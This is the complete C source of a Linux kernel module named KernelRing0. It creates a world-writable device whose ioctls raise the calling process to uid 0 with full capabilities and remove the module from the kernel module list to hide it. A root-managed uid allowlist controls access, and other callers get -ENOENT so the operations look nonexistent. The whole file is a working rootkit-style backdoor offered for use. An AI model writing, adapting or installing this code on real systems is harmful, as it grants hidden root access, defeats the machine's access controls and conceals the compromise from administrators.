// SPDX-License-Identifier: GPL-2.0
/*
 * kernelring0.c - KernelRing0 kernel module
 *
 * Provides /dev/kernelring0 (misc device, mode 0666) exposing ioctls
 * to escalate the caller to uid=0, hide the module, and manage an
 * allowlist of uids that are permitted to use privileged operations.
 *
 * Policy:
 *   - uid 0 (root) is always allowed.
 *   - Allowlist management ioctls (KR0_AL_*) require uid 0.
 *   - Privileged ioctls (ESCALATE / READ_CRED / HIDE) require the
 *     caller uid to be in the allowlist; otherwise -ENOENT is
 *     returned to make the operation look nonexistent.
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/list.h>
#include <linux/slab.h>
#include <linux/uidgid.h>
#include <linux/capability.h>
#include <linux/version.h>
#include <linux/errno.h>
#include <linux/string.h>
#include <linux/mutex.h>

#define DEVICE_NAME "kernelring0"
#define KR0_MAGIC   'K'
#define KR0_MAX_AL  64

struct kr0_cred_info {
    pid_t pid;
    pid_t tgid;
    uid_t uid;
    uid_t euid;
    gid_t gid;
    gid_t egid;
    char  comm[16];
};

struct kr0_al_list {
    int count;
    unsigned int uids[KR0_MAX_AL];
};

#define KR0_ESCALATE    _IOW(KR0_MAGIC, 1, int)
#define KR0_READ_CRED   _IOR(KR0_MAGIC, 2, struct kr0_cred_info)
#define KR0_HIDE        _IO (KR0_MAGIC, 3)
#define KR0_AL_ADD      _IOW(KR0_MAGIC, 4, unsigned int)
#define KR0_AL_DEL      _IOW(KR0_MAGIC, 5, unsigned int)
#define KR0_AL_LIST     _IOWR(KR0_MAGIC, 6, struct kr0_al_list)

static unsigned int kr0_allowlist[KR0_MAX_AL];
static int kr0_al_count;
static DEFINE_MUTEX(kr0_al_lock);

static bool kr0_is_allowed(unsigned int uid)
{
    int i;
    bool found = false;

    if (uid == 0)
        return true;

    mutex_lock(&kr0_al_lock);
    for (i = 0; i < kr0_al_count; i++) {
        if (kr0_allowlist[i] == uid) {
            found = true;
            break;
        }
    }
    mutex_unlock(&kr0_al_lock);
    return found;
}

static int kr0_al_add(unsigned int uid)
{
    int i, ret = 0;

    if (uid == 0)
        return -EINVAL;

    mutex_lock(&kr0_al_lock);
    for (i = 0; i < kr0_al_count; i++) {
        if (kr0_allowlist[i] == uid) {
            ret = -EEXIST;
            goto out;
        }
    }
    if (kr0_al_count >= KR0_MAX_AL) {
        ret = -ENOSPC;
        goto out;
    }
    kr0_allowlist[kr0_al_count++] = uid;
    pr_info("kernelring0: allowlist add uid=%u count=%d\n",
            uid, kr0_al_count);
out:
    mutex_unlock(&kr0_al_lock);
    return ret;
}

static int kr0_al_del(unsigned int uid)
{
    int i, ret = -ENOENT;

    mutex_lock(&kr0_al_lock);
    for (i = 0; i < kr0_al_count; i++) {
        if (kr0_allowlist[i] == uid) {
            memmove(&kr0_allowlist[i], &kr0_allowlist[i + 1],
                    (kr0_al_count - i - 1) * sizeof(unsigned int));
            kr0_al_count--;
            ret = 0;
            pr_info("kernelring0: allowlist del uid=%u count=%d\n",
                    uid, kr0_al_count);
            break;
        }
    }
    mutex_unlock(&kr0_al_lock);
    return ret;
}

static int kr0_escalate_current(void)
{
    struct cred *new_cred;

    new_cred = prepare_creds();
    if (!new_cred) {
        pr_err("kernelring0: prepare_creds() failed\n");
        return -ENOMEM;
    }

    new_cred->uid    = GLOBAL_ROOT_UID;
    new_cred->euid   = GLOBAL_ROOT_UID;
    new_cred->suid   = GLOBAL_ROOT_UID;
    new_cred->fsuid  = GLOBAL_ROOT_UID;

    new_cred->gid    = GLOBAL_ROOT_GID;
    new_cred->egid   = GLOBAL_ROOT_GID;
    new_cred->sgid   = GLOBAL_ROOT_GID;
    new_cred->fsgid  = GLOBAL_ROOT_GID;

    new_cred->cap_permitted = CAP_FULL_SET;
    new_cred->cap_bset      = CAP_FULL_SET;
    cap_clear(new_cred->cap_inheritable);
    cap_clear(new_cred->cap_ambient);

    commit_creds(new_cred);

    pr_info("kernelring0: escalated pid=%d comm=%s to uid=0\n",
            task_tgid_nr(current), current->comm);
    return 0;
}

static void kr0_hide_module(void)
{
    if (!list_empty(&THIS_MODULE->list)) {
        list_del_init(&THIS_MODULE->list);
        pr_info("kernelring0: module removed from module list\n");
    }
}

static long kr0_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
    struct kr0_cred_info info;
    struct kr0_al_list lst;
    struct cred *cred;
    unsigned int caller_uid;
    unsigned int uid;
    int i;

    caller_uid = from_kuid(&init_user_ns, current_uid());

    /* Allowlist management: root only. Hide from non-root. */
    if (cmd == KR0_AL_ADD || cmd == KR0_AL_DEL || cmd == KR0_AL_LIST) {
        if (caller_uid != 0)
            return -ENOENT;
    } else {
        /* Privileged operations: allowlist only. Hide otherwise. */
        if (!kr0_is_allowed(caller_uid))
            return -ENOENT;
    }

    switch (cmd) {
    case KR0_ESCALATE:
        return kr0_escalate_current();

    case KR0_READ_CRED:
        cred = current_cred();
        memset(&info, 0, sizeof(info));
        info.pid  = task_tgid_nr(current);
        info.tgid = task_tgid_nr(current);
        info.uid  = from_kuid(&init_user_ns, cred->uid);
        info.euid = from_kuid(&init_user_ns, cred->euid);
        info.gid  = from_kgid(&init_user_ns, cred->gid);
        info.egid = from_kgid(&init_user_ns, cred->egid);
        memcpy(info.comm, current->comm, sizeof(info.comm) - 1);
        if (copy_to_user((void __user *)arg, &info, sizeof(info)))
            return -EFAULT;
        return 0;

    case KR0_HIDE:
        kr0_hide_module();
        return 0;

    case KR0_AL_ADD:
        if (copy_from_user(&uid, (void __user *)arg, sizeof(uid)))
            return -EFAULT;
        return kr0_al_add(uid);

    case KR0_AL_DEL:
        if (copy_from_user(&uid, (void __user *)arg, sizeof(uid)))
            return -EFAULT;
        return kr0_al_del(uid);

    case KR0_AL_LIST:
        mutex_lock(&kr0_al_lock);
        lst.count = kr0_al_count;
        for (i = 0; i < kr0_al_count; i++)
            lst.uids[i] = kr0_allowlist[i];
        mutex_unlock(&kr0_al_lock);
        if (copy_to_user((void __user *)arg, &lst, sizeof(lst)))
            return -EFAULT;
        return 0;

    default:
        return -EINVAL;
    }
}

static const struct file_operations kr0_fops = {
    .owner          = THIS_MODULE,
    .unlocked_ioctl = kr0_ioctl,
    .compat_ioctl   = kr0_ioctl,
};

static struct miscdevice kr0_misc = {
    .minor = MISC_DYNAMIC_MINOR,
    .name  = DEVICE_NAME,
    .fops  = &kr0_fops,
    .mode  = 0666,
};

static int __init kr0_init(void)
{
    int ret;

    ret = misc_register(&kr0_misc);
    if (ret) {
        pr_err("kernelring0: misc_register() failed: %d\n", ret);
        return ret;
    }

    pr_info("kernelring0: loaded, device /dev/%s mode=0666\n",
            DEVICE_NAME);
    return 0;
}

static void __exit kr0_exit(void)
{
    misc_deregister(&kr0_misc);
    pr_info("kernelring0: unloaded\n");
}

module_init(kr0_init);
module_exit(kr0_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("thisisunusername");
MODULE_DESCRIPTION("KernelRing0: Ring0 privilege gateway with allowlist");
MODULE_VERSION("1.1");
